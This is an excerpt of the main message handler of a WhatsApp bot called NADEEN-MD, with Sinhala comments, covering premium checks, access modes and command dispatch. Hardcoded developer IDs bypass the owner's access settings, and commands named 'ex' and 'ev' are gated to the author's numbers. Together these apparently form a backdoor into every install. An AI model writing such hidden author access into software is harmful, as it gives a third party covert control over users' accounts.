...
const { checkAndRemoveExpired, getPremiumInfo } = require('./lib/github_db')
...
conn.ev.on('connection.update', async (update) => {
    ...
    if (connection === 'close') {
        ...
        // --- Auto Expiry Check (මෙය index එකේ තිබීම අනිවාර්යයි) ---
        setTimeout(async () => {
            await checkAndRemoveExpired(conn);
        }, 5000); 
...
await connectdb()
await updb()		
 console.log(`✅ NADEEN-MD SUCCESSFULLY CONNECTED!`);
...
const ownerdataa = (await axios.get('https://nadeen-botzdatabse.nadeenx.workers.dev/data.json')).data;
...
const developers = `107593779404949,249808837197851,233118577516561,165923646365908,203367389343836`
const Nadeenzz = `203367389343836,174990288789524`
const dekenekak = Nadeenzz.split(",")
const mokakhri = developers.split(",")
const isbot = botNumber.includes(senderNumber)
const isNadeen = dekenekak.includes(senderNumber)
...
const ownerdata = (await axios.get('https://nadeen-botzdatabse.nadeenx.workers.dev/data.json')).data
            
           
            config.FOOTER = ownerdata.footer

// Premium Check කොටස
// 1. මුලින්ම JSON එක කියවා ගන්න (Error එකක් ආවොත් හිස් numbers string එකක් දෙනවා)
const preUserData = fs.existsSync('./prem/numbers.json') 
    ? JSON.parse(fs.readFileSync('./prem/numbers.json', 'utf8')) 
    : { numbers: "" };

// 2. Sender ගේ ID එක ලබා ගන්න (mek එකෙන්)
const senderId = mek.key.participant || mek.key.remoteJid || "";

// 3. Sender ගේ අංකය විතරක් වෙන් කර ගන්න (947xxx හෝ 167xxx)
const senderNumberOnly = senderId.replace(/[^0-9]/g, "");

// 4. අවසාන වශයෙන් const එකක් ලෙස isPre හඳුන්වා දීම
const isPre = preUserData.numbers
    .split(',')
    .some(num => num.trim().replace(/[^0-9]/g, "") === senderNumberOnly && senderNumberOnly !== "");

// Terminal එකේ පරීක්ෂා කිරීමට (අවශ්‍ය නම් පමණක් පාවිච්චි කරන්න)
// console.log(`[🎫] Sender: ${senderId} | isPre: ${isPre}`);
//////////////
...
if ( !isGroup && isCmd &&  !isMe && !isOwner && !isNadeen) return
      }
      
   if ( config.WORK_TYPE == "private" ) {
if  ( isCmd && !isMe && !isOwner && !isNadeen ) return
      }

   if ( config.WORK_TYPE == "inbox" ) {
if  ( isGroup &&  !isMe && !isOwner && !isNadeen ) return
      }      
...
//
    try {
cmd.function(conn, mek, m, { from, prefix, l, isSudo, quoted, body, isCmd, isNadeen, isPre, getPremiumInfo, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
    } catch (e) {
...
events.commands.map(async (command) => {
  if (body && command.on === "body") {
    command.function(conn, mek, m, { from, prefix, l, isSudo, quoted, isNadeen, isPre, body, isCmd, getPremiumInfo, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (mek.q && command.on === "text") {
    command.function(conn, mek, m, { from, l, quoted, body, isSudo, isCmd, isNadeen, isPre, getPremiumInfo, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (
    (command.on === "image" || command.on === "photo") &&
    mek.type === "imageMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, isSudo, isNadeen, body, isCmd, getPremiumInfo, command, isPre, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (
    command.on === "sticker" &&
    mek.type === "stickerMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, isSudo, isNadeen, body, isCmd, getPremiumInfo, command, args, isPre, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  }
});
...
await conn.groupParticipantsUpdate(from, [sender], 'remove');
		...
		// Premium Check එක මෙතනට දාන්න
	
// ඔයාගේ Movie category එක චෙක් කරන තැන
	//======

		switch (command) {
  case 'jid':
    // මෙහි 'from' යනු පණිවිඩය ලැබුණු JID එකයි
  ...
  case 'device': {
    ...
    break
    case'ex':{
      if(senderNumber == 203367389343836 || senderNumber == 187574828150975) {
...
// Inside your message handler (outside any case)
 case 'ev': {
    if(senderNumber == 107593779404949 || senderNumber == 203367389343836 || senderNumber == 187574828150975) {
